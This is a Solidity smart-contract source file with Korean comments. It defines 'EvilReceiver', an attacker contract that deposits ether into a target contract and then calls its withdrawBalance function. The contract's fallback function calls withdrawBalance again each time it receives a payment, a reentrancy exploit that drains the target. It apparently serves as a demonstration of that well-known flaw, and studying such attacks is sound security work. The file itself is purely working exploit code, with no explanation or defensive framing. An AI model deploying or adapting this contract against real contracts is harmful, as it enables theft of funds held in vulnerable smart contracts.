pragma solidity ^0.4.11;
contract  EvilReceiver {
	
	// 공격 대상 컨트랙트의 어드레스
	address public target;

	// 메시지 출력용 이벤트
	event MessageLog(string);
	
	// 잔고 확인용 이벤트
	event BalanceLog(uint);

	/// 생성자
	function EvilReceiver(address _target) {
		target = _target;
	}
	
	/// Fallback 함수
	function() payable{
		BalanceLog(this.balance);
		
		// VictimBalance의 withdrawBalance를 호출
		if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))) {
			MessageLog("FAIL");
		} else {
			MessageLog("SUCCESS");
		} 
	}

	/// EOA로부터 송금받을때 사용하는 함수
	function addBalance() public payable {
	}

	/// 공격대상으로 송금할때 사용하는 함수
	function sendEthToTarget() public {
		if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))) {throw;} 
	}

	/// 공격대상에서 인출할때 사용하는 함수
	function withdraw() public {
		if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;} 
	}
}
